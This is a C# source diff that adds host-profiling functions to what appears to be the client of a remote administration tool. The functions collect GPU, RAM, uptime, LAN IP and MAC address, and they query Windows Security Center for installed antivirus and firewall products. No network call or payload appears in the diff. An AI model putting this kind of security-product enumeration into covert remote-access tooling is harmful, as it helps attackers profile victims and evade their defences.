@@ -13,6 +13,9 @@ using System.Xml;
 using System.Management;
 using System.Security.Cryptography;
 using System.Windows.Forms;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Linq;
 
 namespace Client.Controllers
 {
@@ -22,6 +25,9 @@ namespace Client.Controllers
         public static GeoInformation GeoInfo { get; private set; }
         public static DateTime LastLocated { get; private set; }
         public static bool LocationCompleted { get; private set; }
+        public static bool Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
+        public static bool vistaOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 6;
+
 
         public static void HandleGetAuthentication(ClientMosaic client)
         {
@@ -115,6 +121,30 @@ namespace Client.Controllers
             return "Unknown";
         }
 
+        public static string getGpuName()
+        {
+            try
+            {
+                string gpuName = string.Empty;
+                string query = "SELECT * FROM Win32_DisplayConfiguration";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        gpuName += mObject["Description"].ToString() + "; ";
+                    }
+                }
+                gpuName = removeEnd(gpuName);
+
+                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+
         public static string removeEnd(string input)
         {
             if (input.Length > 2)
@@ -191,6 +221,171 @@ namespace Client.Controllers
             }
 
             return Name;
+        }
+
+        public static int getTotalRamAmount()
+        {
+            try
+            {
+                int installedRAM = 0;
+                string query = "Select * From Win32_ComputerSystem";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
+                        installedRAM = (int)(bytes / 1048576);
+                        break;
+                    }
+                }
+
+                return installedRAM;
+            }
+            catch
+            {
+                return -1;
+            }
+        }
+
+        public static string getUptime()
+        {
+            try
+            {
+                string uptime = string.Empty;
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
+                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);
+
+                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
+                        break;
+                    }
+                }
+
+                if (string.IsNullOrEmpty(uptime))
+                    throw new Exception("Getting uptime failed");
+
+                return uptime;
+            }
+            catch (Exception)
+            {
+                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
+            }
+        }
+
+        public static string getLanIp()
+        {
+            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
+                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
+                {
+                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
+                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
+                        ni.OperationalStatus == OperationalStatus.Up)
+                    {
+                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                        {
+                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
+                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
+                                continue;
+
+                            return ip.Address.ToString();
+                        }
+                    }
+                }
+            }
+
+            return "-";
+        }
+
+        public static string getMacAddress()
+        {
+            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
+                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
+                    ni.OperationalStatus == OperationalStatus.Up)
+                {
+                    bool foundCorrect = false;
+                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                    {
+                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
+                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
+                            continue;
+
+                        foundCorrect = (ip.Address.ToString() == getLanIp());
+                    }
+
+                    if (foundCorrect)
+                        return formatMacAddress(ni.GetPhysicalAddress().ToString());
+                }
+            }
+
+            return "-";
+        }
+
+        public static string formatMacAddress(string macAddress)
+        {
+            return (macAddress.Length != 12)
+                ? "00:00:00:00:00:00"
+                : Regex.Replace(macAddress, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
+        }
+
+        public static string getAntivirus()
+        {
+            try
+            {
+                string antivirusName = string.Empty;
+                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
+                string scope = (vistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
+                string query = "SELECT * FROM AntivirusProduct";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        antivirusName += mObject["displayName"].ToString() + "; ";
+                    }
+                }
+                antivirusName = removeEnd(antivirusName);
+
+                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+
+        public static string GetFirewall()
+        {
+            try
+            {
+                string firewallName = string.Empty;
+                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
+                string scope = (vistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
+                string query = "SELECT * FROM FirewallProduct";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        firewallName += mObject["displayName"].ToString() + "; ";
+                    }
+                }
+                firewallName = removeEnd(firewallName);
+
+                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
         }
 
         public static void geoLocationInitialize()
